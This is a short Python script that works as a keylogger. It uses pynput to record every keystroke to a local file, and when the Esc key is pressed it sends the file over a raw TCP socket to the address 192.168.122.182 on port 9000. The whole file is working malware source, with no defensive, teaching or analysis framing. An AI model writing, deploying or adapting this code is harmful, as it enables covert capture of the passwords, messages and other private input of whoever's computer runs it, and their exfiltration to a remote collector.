import os
from pynput import keyboard
import socket

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            f.write(str(key) + '\n')
            print(f"[+] Key pressed: {key}")
    except Exception as e:
        print(f"[-] Error writing to file: {e}")

def transmit_logs():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('192.168.122.182', 9000))
            with open('keylogs.txt', 'rb') as f:
                data = f.read()
                s.sendall(data)
        print("[+] Logs transmitted successfully")
    except Exception as e:
        print(f"[-] Error transmitting logs: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

transmit_logs()